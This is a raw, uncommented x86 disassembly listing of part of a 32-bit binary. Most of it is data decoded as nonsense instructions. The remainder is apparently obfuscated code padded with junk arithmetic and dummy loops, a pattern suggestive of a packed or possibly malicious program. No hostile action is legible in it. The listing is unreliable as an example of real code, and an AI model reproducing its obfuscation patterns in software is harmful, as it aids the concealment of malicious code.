  403034:	fsubrp st(3),st
  403036:	pop    ebx
  403037:	xor    bh,BYTE PTR [eax-0x23f7343]
  40303d:	out    0x89,al
  40303f:	sub    al,0xb2
  403041:	fwait
  403042:	jnp    0x402fdc
  403044:	mov    dl,0xf3
  403046:	ins    DWORD PTR es:[edi],dx
  403047:	in     al,dx
  403048:	cdq    
  403049:	jecxz  0x40306b
  40304b:	outs   dx,BYTE PTR ds:[esi]
  40304c:	pop    esi
  40304d:	lods   eax,DWORD PTR ds:[esi]
  40304e:	inc    ebp
  40304f:	mov    dh,0x56
  403051:	mov    ebx,0xe7fa3c76
  403056:	loopne 0x4030a3
  403058:	jecxz  0x402feb
  40305a:	enter  0x567b,0x2
  40305e:	or     al,0x97
  403060:	lock xchg dx,ax
  403063:	aas    
  403064:	sub    eax,0xf321580e
  403069:	ja     0x402ffc
  40306b:	mov    al,0xa1
  40306d:	rcr    cl,0xf8
  403070:	sub    al,0xc1
  403072:	sub    DWORD PTR [esp+ecx*4],0xde7964c5
  403079:	xor    ebp,0x962be74c
  40307f:	and    esp,DWORD PTR [esi-0x17bb68fa]
  403085:	pop    ebp
  403086:	xchg   ecx,eax
  403087:	aaa    
  403088:	or     DWORD PTR [edx+0x2c82e0f0],0xfc40e83e
  403092:	add    BYTE PTR [ecx+0x16],cl
  403095:	ret    0x63ca
  403098:	xor    ebx,DWORD PTR [ecx+edx*1]
  40309b:	jno    0x403047
  40309d:	push   edi
  40309e:	int    0x76
  4030a0:	fiadd  DWORD PTR [edx+ebp*4-0x37]
  4030a4:	jle    0x40304f
  4030a6:	test   ch,ch
  4030a8:	push   ebp
  4030a9:	lods   eax,DWORD PTR ds:[esi]
  4030aa:	lea    esi,[ebx+ecx*1]
  4030ad:	xor    esi,DWORD PTR [edx]
  4030af:	mov    cl,0x16
  4030b1:	mov    al,ds:0xa5de275a
  4030b6:	or     al,BYTE PTR [edx]
  4030b8:	scas   eax,DWORD PTR es:[edi]
  4030b9:	ins    DWORD PTR es:[edi],dx
  4030ba:	push   cs
  4030bb:	xchg   DWORD PTR fs:[edx-0x13],esi
  4030bf:	or     BYTE PTR [edx-0x786c29f4],cl
  4030c5:	in     eax,dx
  4030c6:	push   esp
  4030c7:	js     0x403124
  4030c9:	sbb    DWORD PTR [esp+esi*4+0x7c],ecx
  4030cd:	adc    DWORD PTR [edi+0x73],ebx
  4030d0:	lea    edx,[ecx+eax*1]
  4030d3:	jl     0x4030b8
  4030d5:	pop    ebp
  4030d6:	inc    ecx
  4030d7:	add    BYTE PTR [esi-0x2f],ch
  4030da:	add    eax,0xce0e6cf9
  4030df:	rol    DWORD PTR [esi],1
  4030e1:	sar    DWORD PTR cs:[eax+0x5cc052d],1
  4030e8:	loopne 0x403107
  4030ea:	popf   
  4030eb:	sti    
  4030ec:	cdq    
  4030ed:	add    ah,bh
  4030ef:	sub    esp,ecx
  4030f1:	dec    esi
  4030f2:	jae    0x4030d8
  4030f4:	ret    0xdf9c
  4030f7:	mov    al,0x79
  4030f9:	mov    edi,0x31f8c8dd
  4030fe:	ja     0x403147
  403100:	mov    DWORD PTR [edi+0x58],esp
  403103:	adc    DWORD PTR [ebx-0x29],0x76e8231c
  40310a:	push   ecx
  40310b:	jle    0x4030e4
  40310d:	scas   al,BYTE PTR es:[edi]
  40310e:	fild   QWORD PTR [ebx]
  403110:	repnz test BYTE PTR [ecx-0x48],cl
  403114:	dec    eax
  403115:	mov    ds:0x1e861cc1,al
  40311a:	jns    0x4030bf
  40311c:	pop    edi
  40311d:	mov    ch,0x41
  40311f:	inc    ebx
  403120:	lods   eax,DWORD PTR ds:[esi]
  403121:	inc    esi
  403122:	leave  
  403123:	sub    al,0x51
  403125:	xchg   ebp,eax
  403126:	push   ds
  403127:	jmp    0xbd7a:0xa77fceea
  40312e:	out    0xc4,al
  403130:	pop    ss
  403131:	adc    al,0x9
  403133:	imul   BYTE PTR [esi]
  403135:	(bad)  
  403137:	mov    ch,0x2b
  403139:	iret   
  40313a:	mov    eax,ds:0xbcc6d9b6
  40313f:	dec    ecx
  403140:	mov    al,0x20
  403142:	ret    
  403143:	mov    ch,0xf7
  403145:	imul   eax,DWORD PTR [edx-0x5],0x5c69e9f4
  40314c:	fnstsw WORD PTR [edi-0x78]
  40314f:	out    dx,eax
  403150:	or     BYTE PTR [ebp-0x75],0xe3
  403154:	(bad)  
  403155:	aas    
  403156:	cli    
  403157:	xchg   BYTE PTR ds:0x3076d4c4,ch
  40315d:	stos   DWORD PTR es:[edi],eax
  40315e:	mov    al,0xb8
  403160:	push   eax
  403161:	loopne 0x40317c
  403163:	jecxz  0x4030e6
  403165:	inc    ebx
  403166:	into   
  403167:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403168:	fist   WORD PTR [edx-0x889d7f]
  40316e:	or     dl,BYTE PTR [ebp+0x42]
  403171:	in     al,dx
  403172:	mul    DWORD PTR [esi-0xf6e4ee0]
  403178:	pushf  
  403179:	mov    eax,ds:0xff7192b3
  40317e:	push   ecx
  40317f:	test   eax,0x27feb576
  403184:	mov    ds:0x4856713a,al
  403189:	aas    
  40318a:	fnstenv [esi+esi*1-0xa]
  40318e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40318f:	int    0xe4
  403191:	push   edi
  403192:	or     bh,BYTE PTR [esi]
  403194:	sbb    ebx,DWORD PTR [ecx+0x78]
  403197:	in     al,0xd3
  403199:	out    dx,al
  40319a:	shr    BYTE PTR [edx-0x1b2a7aa9],0xc
  4031a1:	mov    edx,0x63cffdc5
  4031a6:	stos   BYTE PTR es:[edi],al
  4031a7:	test   DWORD PTR [esi-0x38efab6],0x3a5a8a8e
  4031b1:	push   ebp
  4031b2:	in     eax,0xf
  4031b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031b5:	out    0x24,al
  4031b7:	imul   edi,DWORD PTR [edx+edi*1+0x16b94e61],0xffffffb8
  4031bf:	add    ecx,DWORD PTR [ebx-0x6a50f9b4]
  4031c5:	test   eax,0xd7c401e6
  4031ca:	rcr    DWORD PTR [esi],1
  4031cc:	dec    edx
  4031cd:	icebp  
  4031ce:	test   bh,al
  4031d0:	repz imul edi,ecx,0xffffffe7
  4031d4:	rol    BYTE PTR [esi],1
  4031d6:	or     al,0xbf
  4031d8:	(bad)  
  4031d9:	cld    
  4031da:	push   ss
  4031db:	jb     0x403254
  4031dd:	mov    eax,0xa536c4b1
  4031e2:	inc    edi
  4031e3:	push   ebp
  4031e4:	mov    bl,0x93
  4031e6:	lods   eax,DWORD PTR ds:[esi]
  4031e7:	mov    ds:0xec0067ef,al
  4031ec:	pusha  
  4031ed:	jb     0x4031d6
  4031ef:	ins    BYTE PTR es:[edi],dx
  4031f0:	mov    ebp,0x10e41044
  4031f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031f6:	fcomp  QWORD PTR [ecx+edx*4-0x35]
  4031fa:	ja     0x40320c
  4031fc:	icebp  
  4031fd:	sub    eax,DWORD PTR cs:[edi-0x7c84db61]
  403204:	cli    
  403205:	shl    DWORD PTR [edx],1
  403207:	ror    edx,1
  403209:	xor    DWORD PTR [ecx+0x1],eax
  40320c:	push   edi
  40320d:	cmp    eax,0xd4e3d729
  403212:	sbb    bl,BYTE PTR [ebx+edi*4+0x70]
  403216:	fbstp  TBYTE PTR [ecx+0x12a32efb]
  40321c:	out    dx,al
  40321d:	arpl   bp,cx
  40321f:	popa   
  403220:	and    ebx,DWORD PTR [eax-0x48]
  403223:	inc    ebp
  403224:	in     al,dx
  403225:	and    ebx,DWORD PTR [eax-0x425ee537]
  40322b:	js     0x403274
  40322d:	xchg   DWORD PTR [ebp-0x62],ebx
  403230:	mov    eax,ds:0xfa0e0b93
  403235:	outs   dx,BYTE PTR ds:[esi]
  403236:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403237:	jns    0x4032a2
  403239:	dec    edx
  40323a:	sub    edx,DWORD PTR [esi+0x4d952ef9]
  403240:	and    BYTE PTR [ebx-0x35],0x94
  403244:	xchg   edx,eax
  403245:	mov    WORD PTR [edi],gs
  403247:	scas   al,BYTE PTR es:[edi]
  403248:	pop    es
  403249:	mov    dl,0xcf
  40324b:	sbb    DWORD PTR [esi+ebx*8+0x41f7b792],0x3e
  403253:	mov    esi,0xf2b03f2f
  403258:	push   edi
  403259:	lahf   
  40325a:	push   ebx
  40325b:	test   DWORD PTR [edx-0x1834d1d5],ebp
  403261:	loope  0x403239
  403263:	mov    ebx,0xdd68a68e
  403268:	jp     0x403243
  40326a:	mov    DWORD PTR [edx-0x6b],ebx
  40326d:	xor    al,0xd4
  40326f:	mov    ah,0x18
  403271:	cmp    BYTE PTR [eax+0x4c528abc],cl
  403277:	in     eax,dx
  403278:	mov    al,ds:0x7d614c44
  40327d:	in     al,dx
  40327e:	es inc edx
  403280:	mov    ds,WORD PTR [edi-0x44]
  403283:	int3   
  403284:	pop    es
  403285:	and    dl,ch
  403287:	jmp    0x403273
  403289:	and    al,0xde
  40328b:	hlt    
  40328c:	pop    es
  40328d:	mov    WORD PTR [esi],gs
  40328f:	test   eax,0xb30c8b09
  403294:	push   edi
  403295:	ror    ebp,0x77
  403298:	pop    esp
  403299:	retf   
  40329a:	dec    esi
  40329b:	fadd   QWORD PTR ds:0x13c3a950
  4032a1:	hlt    
  4032a2:	xchg   ebx,eax
  4032a3:	sub    BYTE PTR [ebx-0x73],bl
  4032a6:	aad    0xf3
  4032a8:	jg     0x4032e3
  4032aa:	push   edx
  4032ab:	push   esp
  4032ac:	add    BYTE PTR [ebp+esi*1+0x62],bh
  4032b0:	adc    al,0x97
  4032b2:	test   eax,0xbe8993d7
  4032b7:	retf   
  4032b8:	push   ss
  4032b9:	pop    ds
  4032ba:	add    ecx,esi
  4032bc:	(bad)  
  4032bd:	outs   dx,BYTE PTR ds:[esi]
  4032be:	sbb    eax,0x367830a3
  4032c3:	pushf  
  4032c4:	add    al,0x4b
  4032c6:	leave  
  4032c7:	inc    esp
  4032c8:	lock in al,0x36
  4032cb:	fdiv   QWORD PTR [ebp+0x6b56322c]
  4032d1:	iret   
  4032d2:	call   0xc967442d
  4032d7:	cld    
  4032d8:	mov    ebx,0x4a6e5aff
  4032dd:	adc    al,0x8d
  4032df:	scas   eax,DWORD PTR es:[edi]
  4032e0:	pop    eax
  4032e1:	cld    
  4032e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032e3:	dec    ecx
  4032e4:	push   ecx
  4032e5:	imul   esi,DWORD PTR [edx],0x49b37939
  4032eb:	ss and esi,esi
  4032ee:	jb     0x4032a7
  4032f0:	imul   esp,DWORD PTR [ebx-0x16],0xffffffe6
  4032f4:	and    esi,esi
  4032f6:	shl    BYTE PTR [esi-0x2f41f95],cl
  4032fc:	add    esi,eax
  4032fe:	sbb    DWORD PTR [ebx],edi
  403300:	test   BYTE PTR [edi+ecx*8+0x25],cl
  403304:	aaa    
  403305:	imul   ecx,DWORD PTR [ebx-0x65],0x8f716bd9
  40330c:	adc    DWORD PTR [ebp-0x74],0xfffffff0
  403310:	aad    0xdf
  403312:	iret   
  403313:	fsub   DWORD PTR [esi+edx*1]
  403316:	aas    
  403317:	js     0x403385
  403319:	sbb    eax,0x2d25f857
  40331e:	push   es
  40331f:	add    esi,eax
  403321:	sbb    bl,BYTE PTR [ebp+0x4e]
  403324:	aas    
  403325:	mov    bh,0xf5
  403327:	adc    eax,0x271beaa3
  40332c:	jg     0x403395
  40332e:	or     al,0x8e
  403330:	fwait
  403331:	loope  0x4032e4
  403333:	sbb    al,bh
  403335:	nop
  403336:	loopne 0x40334e
  403338:	inc    edx
  403339:	scas   al,BYTE PTR es:[edi]
  40333a:	xor    ah,BYTE PTR [esi+0x4916173b]
  403340:	and    edi,DWORD PTR [eax+eiz*8+0x8]
  403344:	hlt    
  403345:	enter  0xbaba,0xa2
  403349:	test   al,0xec
  40334b:	shl    BYTE PTR ds:0xb1af8f29,0xde
  403352:	add    DWORD PTR [esi-0x32],ebp
  403355:	or     bl,BYTE PTR [edx+0x7a]
  403358:	jo     0x403334
  40335a:	daa    
  40335b:	pop    eax
  40335c:	jl     0x4032e9
  40335e:	retf   0x69a1
  403361:	jno    0x4033ab
  403363:	retf   0xd3e7
  403366:	jne    0x403391
  403368:	fnstcw WORD PTR [esi+eiz*8]
  40336b:	cwde   
  40336c:	cmp    cl,BYTE PTR [ebp-0x26]
  40336f:	push   edx
  403370:	(bad)  
  403371:	into   
  403372:	add    ah,BYTE PTR [edi+0x4105e3c3]
  403378:	mov    esp,0xb1711bf
  40337d:	rcl    DWORD PTR [ebp-0x33d7ab41],1
  403383:	addr16 mov ebp,0xc24f3079
  403389:	in     al,0x61
  40338b:	mov    dl,0x73
  40338d:	retf   
  40338e:	das    
  40338f:	shr    DWORD PTR [eax-0x7b295e37],1
  403395:	and    ch,dl
  403397:	cmp    DWORD PTR [edi+0x2b],0x4f09f041
  40339e:	jmp    0x40340b
  4033a0:	scas   al,BYTE PTR es:[edi]
  4033a1:	aad    0x57
  4033a3:	imul   ecx,ecx,0x36df7810
  4033a9:	sbb    BYTE PTR [ebx-0x5f9b76ed],cl
  4033af:	jbe    0x403338
  4033b1:	dec    ebp
  4033b2:	(bad)  
  4033b3:	enter  0x7aee,0xe3
  4033b7:	sbb    al,0x9d
  4033b9:	dec    ebx
  4033ba:	inc    edi
  4033bb:	int    0xd4
  4033bd:	mov    ah,0x5a
  4033bf:	jns    0x4033d5
  4033c1:	push   ds
  4033c2:	aad    0xfe
  4033c4:	pusha  
  4033c5:	lods   eax,DWORD PTR ds:[esi]
  4033c6:	dec    edx
  4033c7:	cld    
  4033c8:	and    esp,esi
  4033ca:	pop    eax
  4033cb:	lds    esi,FWORD PTR [ebp+0x17e3e395]
  4033d1:	addr16 or al,0x1a
  4033d4:	mov    edi,0x96a0f3af
  4033d9:	fadd   DWORD PTR [esi+0x4f761dc5]
  4033df:	add    ecx,ebx
  4033e1:	mov    ebx,0xd36193a3
  4033e6:	enter  0xad6c,0xc1
  4033ea:	xor    DWORD PTR [ebx+0xeee7599],esp
  4033f0:	xchg   edx,eax
  4033f1:	add    DWORD PTR [eax],ecx
  4033f3:	pushf  
  4033f4:	or     edx,0x5e
  4033f7:	jmp    0xc462ee46
  4033fc:	sar    DWORD PTR [edx+eiz*1],1
  4033ff:	add    eax,esi
  403401:	sub    ah,al
  403403:	push   ebx
  403404:	in     eax,dx
  403405:	pop    edx
  403406:	push   0xffffffc0
  403408:	push   cs
  403409:	cmp    al,0xbb
  40340b:	and    eax,0x1caba615
  403410:	mul    DWORD PTR [edi+0x70]
  403413:	dec    edi
  403414:	and    DWORD PTR [edi],esi
  403416:	mov    dh,0x34
  403418:	xchg   edi,eax
  403419:	pop    es
  40341a:	mov    eax,ds:0x947809e8
  40341f:	div    BYTE PTR [edi-0x17]
  403422:	or     esi,DWORD PTR [ebx]
  403424:	je     0x4033be
  403426:	sbb    edi,DWORD PTR [eax]
  403428:	test   DWORD PTR [ebx],esp
  40342a:	popa   
  40342b:	ins    BYTE PTR es:[edi],dx
  40342c:	ja     0x403439
  40342e:	out    dx,al
  40342f:	mov    edx,0x62194f85
  403434:	clc    
  403435:	push   ebp
  403436:	call   0x368f5c9
  40343b:	fnstcw WORD PTR [esi+0x64]
  40343e:	sbb    esp,DWORD PTR [edx-0x1d]
  403441:	sub    ebx,ebp
  403443:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403444:	cli    
  403445:	pop    edi
  403446:	aas    
  403447:	pop    eax
  403448:	mov    dh,0xd6
  40344a:	mov    bl,BYTE PTR [ecx]
  40344c:	mov    edx,0x2fe871b7
  403451:	(bad)  
  403452:	mov    ds:0xf70b66af,eax
  403457:	test   DWORD PTR [edi],edi
  403459:	in     eax,dx
  40345a:	jecxz  0x4034ad
  40345c:	fstp   QWORD PTR [ebp+0x6b7fac3a]
  403462:	(bad)  [eax-0x20b22e3e]
  403468:	leave  
  403469:	cwde   
  40346a:	fiadd  DWORD PTR [edi-0x60]
  40346d:	(bad)  
  40346e:	loopne 0x403454
  403470:	sbb    DWORD PTR [edi-0x6bbecee5],ecx
  403476:	sbb    esi,DWORD PTR [ecx-0x5c]
  403479:	stos   BYTE PTR es:[edi],al
  40347a:	adc    al,0x96
  40347c:	pop    ebp
  40347d:	les    ecx,FWORD PTR [edi+ebx*8-0x45]
  403481:	shl    DWORD PTR [ecx-0x8],1
  403484:	mov    DWORD PTR [eax],ecx
  403486:	bound  ecx,QWORD PTR [eax]
  403488:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403489:	jae    0x403451
  40348b:	sbb    BYTE PTR [ebx-0x2d64d6d7],0x97
  403492:	call   0xaf3d:0xa229b2c1
  403499:	in     eax,dx
  40349a:	push   edx
  40349b:	or     al,0xc7
  40349d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40349e:	push   esi
  40349f:	aad    0xd1
  4034a1:	jg     0x40351c
  4034a3:	sub    DWORD PTR [edx],edx
  4034a5:	popa   
  4034a6:	xor    BYTE PTR [ebx+0x61e8a17d],cl
  4034ac:	sbb    eax,0xdc8ee5cf
  4034b1:	fisttp WORD PTR [ecx+0xe]
  4034b4:	or     eax,0x9d0b41bf
  4034b9:	cmp    ebp,0x47cea548
  4034bf:	mov    ds:0x6e46218a,eax
  4034c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034c5:	ret    
  4034c6:	fwait
  4034c7:	test   eax,0x4c325c5f
  4034cc:	push   ss
  4034cd:	test   al,0x37
  4034cf:	adc    al,0x16
  4034d1:	mov    es,WORD PTR [edx-0x5ac78c5a]
  4034d7:	mov    ecx,0xf876e94d
  4034dc:	(bad)  
  4034dd:	jl     0x4034ab
  4034df:	adc    dh,ch
  4034e1:	neg    ch
  4034e3:	mov    al,0x39
  4034e5:	cmp    dh,BYTE PTR [edi-0x56]
  4034e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034e9:	outs   dx,BYTE PTR ds:[esi]
  4034ea:	ficom  WORD PTR [ebx+0x61]
  4034ed:	call   0xb647d423
  4034f2:	adc    cl,BYTE PTR [ecx+0x482aefcb]
  4034f8:	adc    al,0x5f
  4034fa:	cmp    al,0xad
  4034fc:	mov    ch,0xa0
  4034fe:	and    ch,bl
  403500:	cmp    bh,dl
  403502:	fsubr  QWORD PTR [edx+0x508f7e1b]
  403508:	sub    BYTE PTR [edx+0x1d],ah
  40350b:	cmp    al,0xe4
  40350d:	icebp  
  40350e:	xor    BYTE PTR [ecx],dl
  403510:	or     ah,dl
  403512:	push   es
  403513:	lods   eax,DWORD PTR ds:[esi]
  403514:	lea    edi,[ebx+0x64]
  403517:	call   0xc89b:0xd0cf73fc
  40351e:	mov    dh,0x12
  403520:	cmp    BYTE PTR [edi-0x73b87656],bh
  403526:	hlt    
  403527:	mov    eax,ds:0xb2afcf6b
  40352c:	retf   0xc43e
  40352f:	das    
  403530:	push   cs
  403531:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403532:	push   ds
  403533:	mov    dh,0xb9
  403535:	mov    al,ds:0x29a39cd3
  40353a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40353b:	imul   esp,DWORD PTR [edx+edx*2],0xffffffcf
  40353f:	pop    esp
  403540:	out    0xc8,eax
  403542:	sti    
  403543:	jmp    0x4034d9
  403545:	aaa    
  403546:	(bad)  
  403547:	jmp    0xaf26601
  40354c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40354d:	cmp    DWORD PTR [esi-0x53b4a40],ebp
  403553:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403554:	sub    al,0xcd
  403556:	mov    ds:0xe68680e7,al
  40355b:	jmp    0xd76c:0x463e197b
  403562:	outs   dx,BYTE PTR ds:[esi]
  403563:	dec    BYTE PTR [edi-0x5d108f1f]
  403569:	xchg   edx,ebx
  40356b:	inc    ebp
  40356c:	mov    es,esi
  40356e:	rdpmc  
  403570:	or     edi,0x3be80be6
  403576:	cmp    ecx,DWORD PTR [ebp+0x5b2d5a62]
  40357c:	push   ebx
  40357d:	mov    edx,0x4e0b6dd8
  403582:	and    edx,edx
  403584:	test   BYTE PTR [ebx+0x3f],0x17
  403588:	push   ebx
  403589:	call   FWORD PTR [edx-0x2c]
  40358c:	(bad)  
  40358d:	in     eax,dx
  40358e:	lods   eax,DWORD PTR ds:[esi]
  40358f:	mov    ah,BYTE PTR [eax-0x15]
  403592:	rcr    ebx,cl
  403594:	sub    DWORD PTR [ebp+0x5d7b8e66],ebp
  40359a:	xor    bh,BYTE PTR [edx-0x66c8877d]
  4035a0:	cli    
  4035a1:	cmp    al,BYTE PTR [ecx-0x59]
  4035a4:	fwait
  4035a5:	jg     0x40356f
  4035a7:	pop    ecx
  4035a8:	jmp    0x40353f
  4035aa:	sub    DWORD PTR [esi+0x75],ecx
  4035ad:	aad    0xa9
  4035af:	add    dl,bh
  4035b1:	aad    0x76
  4035b3:	mov    esi,DWORD PTR [ebx]
  4035b5:	cmp    al,0x4a
  4035b7:	and    edx,DWORD PTR [esi]
  4035b9:	pop    ecx
  4035ba:	mov    esi,0x3c194f85
  4035bf:	dec    eax
  4035c0:	mov    ch,0x5d
  4035c2:	shl    BYTE PTR [ebx],1
  4035c4:	mov    bl,0x1d
  4035c6:	inc    ebp
  4035c7:	jnp    0x40361e
  4035c9:	ja     0x40362e
  4035cb:	dec    ebx
  4035cc:	dec    eax
  4035cd:	xchg   ebp,eax
  4035ce:	jp     0x4035d0
  4035d0:	cmp    al,0x46
  4035d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035d3:	inc    ebp
  4035d4:	push   cs
  4035d5:	sub    al,bh
  4035d7:	in     eax,dx
  4035d8:	jno    0x40359b
  4035da:	jmp    0x403658
  4035dc:	cmp    DWORD PTR [eax],ecx
  4035de:	mov    ch,0xb6
  4035e0:	fs (bad) 
  4035e2:	dec    ebx
  4035e3:	ret    
  4035e4:	mov    edi,0x1a63d9d5
  4035e9:	push   eax
  4035ea:	aas    
  4035eb:	jmp    0x26389bd9
  4035f0:	inc    ecx
  4035f1:	mov    bh,0x3b
  4035f3:	adc    esp,esp
  4035f5:	add    al,0x9c
  4035f7:	fdiv   st(0),st
  4035f9:	in     eax,0x1c
  4035fb:	cmp    al,0xad
  4035fd:	cmp    ebx,edx
  4035ff:	and    eax,0x2b9c505b
  403604:	outs   dx,BYTE PTR ds:[esi]
  403605:	lods   al,BYTE PTR ds:[esi]
  403606:	outs   dx,DWORD PTR ds:[esi]
  403607:	mov    esi,0xa49efbf3
  40360c:	aam    0x55
  40360e:	(bad)  
  403610:	mov    al,ds:0xd92ac43b
  403615:	mov    eax,ds:0x899cd92b
  40361a:	inc    esp
  40361b:	xchg   esi,eax
  40361c:	pop    es
  40361d:	rcr    DWORD PTR [eax-0x13],cl
  403620:	iret   
  403621:	jno    0x4035e5
  403623:	inc    edx
  403624:	out    dx,eax
  403625:	add    eax,0x9b6206a6
  40362a:	xor    BYTE PTR [ebp+edi*2+0x4d89cb55],bl
  403631:	call   0xffa0bbfd
  403636:	(bad)  
  403637:	(bad)  
  403638:	mov    esp,0xa1f89c85
  40363d:	and    al,0x90
  40363f:	inc    edx
  403640:	add    BYTE PTR [ecx],al
  403642:	add    eax,0x42a014
  403647:	mov    eax,DWORD PTR [ebp-0x14]
  40364a:	mov    DWORD PTR [ebp-0x9c],eax
  403650:	adc    eax,0x5b9f
  403655:	mov    eax,DWORD PTR [ebp-0x18]
  403658:	sbb    DWORD PTR ds:0x42d004,0x42c01c
  403662:	mov    DWORD PTR [ebp-0x98],eax
  403668:	mov    eax,DWORD PTR [ebp-0x2c]
  40366b:	sub    DWORD PTR ds:0x429004,0x429014
  403675:	xor    eax,esi
  403677:	sub    DWORD PTR ds:0x429000,0x42c014
  403681:	add    eax,edi
  403683:	mov    DWORD PTR [ebp-0x94],eax
  403689:	lea    eax,[ebp-0x48]
  40368c:	mov    DWORD PTR [ebp-0x90],eax
  403692:	mov    eax,DWORD PTR [ebp-0xa0]
  403698:	xor    eax,esi
  40369a:	sbb    DWORD PTR ds:0x42a014,0x429000
  4036a4:	add    eax,edi
  4036a6:	sbb    DWORD PTR ds:0x42d010,0x42c00c
  4036b0:	mov    DWORD PTR [ebp-0xa0],eax
  4036b6:	xor    DWORD PTR ds:0x42a010,0x42901c
  4036c0:	lea    eax,[ebp-0xa0]
  4036c6:	push   eax
  4036c7:	sub    DWORD PTR ds:0x42d008,ebx
  4036cd:	mov    eax,DWORD PTR [ebp+0xc]
  4036d0:	or     DWORD PTR ds:0x42d01c,0x42a01c
  4036da:	xor    eax,esi
  4036dc:	xor    DWORD PTR ds:0x429000,0x42c018
  4036e6:	add    eax,edi
  4036e8:	xor    DWORD PTR ds:0x42a008,0x7741
  4036f2:	push   eax
  4036f3:	xor    eax,eax
  4036f5:	or     eax,DWORD PTR ds:0x42901c
  4036fb:	adc    DWORD PTR ds:0x42a00c,eax
  403701:	mov    eax,ds:0x42f38b
  403706:	push   0x42f2e1
  40370b:	add    DWORD PTR ds:0x429004,0x6a27
  403715:	push   DWORD PTR [eax]
  403717:	sub    DWORD PTR ds:0x429004,0x42d008
  403721:	call   0x40cc14
  403726:	and    ecx,0x7055
  40372c:	mov    ebx,DWORD PTR [ebp-0x14]
  40372f:	mov    DWORD PTR ds:0x42b008,0x1f
  403739:	cmp    DWORD PTR ds:0x42b008,0x0
  403740:	je     0x403790
  403746:	cmp    DWORD PTR ds:0x42b008,0x10
  40374d:	jbe    0x403790
  403753:	jmp    0x403764
  403758:	push   DWORD PTR [ebp-0x18]
  40375b:	push   DWORD PTR [ebp-0xc]
  40375e:	call   DWORD PTR ds:0x43002b
  403764:	cmp    DWORD PTR ds:0x42b008,0x11
  40376b:	jne    0x40377e
  403771:	mov    ecx,DWORD PTR ds:0x42b008
  403777:	dec    ecx
  403778:	mov    DWORD PTR ds:0x42b008,ecx
  40377e:	mov    ecx,DWORD PTR ds:0x42b008
  403784:	dec    ecx
  403785:	mov    DWORD PTR ds:0x42b008,ecx
  40378b:	jmp    0x403739
  403790:	mov    eax,DWORD PTR [ebp-0x18]
  403793:	mov    DWORD PTR [ebp-0x58],eax
  403796:	mov    DWORD PTR [ebp-0x34],0xf89c8533
  40379d:	mov    ecx,0xf89c85b1
  4037a2:	mov    edx,DWORD PTR ds:0x424ab8
  4037a8:	mov    edx,DWORD PTR [edx]
  4037aa:	sbb    DWORD PTR ds:0x42c00c,edx
  4037b0:	mov    DWORD PTR [ebp-0x1c],ecx
  4037b3:	lea    eax,[ecx-0x1]
  4037b6:	or     DWORD PTR ds:0x42d014,ebx
  4037bc:	mov    DWORD PTR [ebp-0x28],eax
  4037bf:	movzx  edx,WORD PTR ds:0x42a000
  4037c6:	sub    DWORD PTR ds:0x42b018,edx
  4037cc:	mov    DWORD PTR [ebp-0x10],ecx
  4037cf:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  4037d6:	add    DWORD PTR ds:0x42c014,0x7fdd
  4037e0:	mov    ecx,DWORD PTR [ebp-0x10]
  4037e3:	xor    ecx,esi
  4037e5:	mov    edx,0xffcd8d94
  4037ea:	sub    edx,ecx
  4037ec:	mov    ecx,0x1367
  4037f1:	mov    DWORD PTR [ebp-0xc],edx
  4037f4:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  4037fb:	mov    ecx,DWORD PTR [ebp-0x8]
  4037fe:	mov    DWORD PTR [ebp-0x3c],ebx
  403801:	cmp    ecx,eax
  403803:	je     0x405f34
  403809:	mov    eax,DWORD PTR [ebp-0x10]
  40380c:	xor    DWORD PTR ds:0x42901c,edi
  403812:	mov    ecx,DWORD PTR [ebp-0x10]
  403815:	xor    eax,esi
  403817:	add    DWORD PTR ds:0x42b014,0x42901c
  403821:	xor    ecx,esi
  403823:	add    DWORD PTR ds:0x429000,0x42c010
  40382d:	lea    ecx,[eax+ecx*1+0x64e5d8]
  403834:	mov    eax,DWORD PTR [ebp-0xc]
  403837:	dec    DWORD PTR ds:0x42c004
  40383d:	xor    edx,edx
  40383f:	sub    DWORD PTR ds:0x429008,0x6755
  403849:	div    ecx
  40384b:	dec    ecx
  40384c:	mov    eax,DWORD PTR [ebp-0x8]
  40384f:	add    DWORD PTR ds:0x429018,ecx
  403855:	mov    ecx,DWORD PTR [ebp-0x10]
  403858:	xor    eax,esi
  40385a:	adc    DWORD PTR ds:0x42d000,0x42a010
  403864:	xor    ecx,esi
  403866:	add    DWORD PTR ds:0x42900c,0x1115
  403870:	sub    eax,ecx
  403872:	mov    DWORD PTR ds:0x429020,0x13e
  40387c:	cmp    edx,eax
  40387e:	jne    0x405e79
  403884:	add    DWORD PTR ds:0x42b000,0x4efc
  40388e:	mov    eax,DWORD PTR [ebp-0xc]
  403891:	and    DWORD PTR ds:0x42b004,0x0
  40389b:	mov    ecx,DWORD PTR ds:0x42b004
  4038a1:	inc    ecx
  4038a2:	mov    DWORD PTR ds:0x42b004,ecx
  4038a8:	cmp    DWORD PTR ds:0x42b004,0x8
  4038af:	jle    0x4038f6
  4038b5:	jmp    0x4038cf
  4038ba:	push   0x1152
  4038bf:	push   0x42c014
  4038c4:	push   0x42f035
  4038c9:	call   DWORD PTR ds:0x430033
  4038cf:	cmp    DWORD PTR ds:0x42b004,0x7
  4038d6:	jne    0x4038e9
  4038dc:	mov    ecx,DWORD PTR ds:0x42b004
  4038e2:	inc    ecx
  4038e3:	mov    DWORD PTR ds:0x42b004,ecx
  4038e9:	cmp    DWORD PTR ds:0x42b004,0x16
  4038f0:	jb     0x40389b
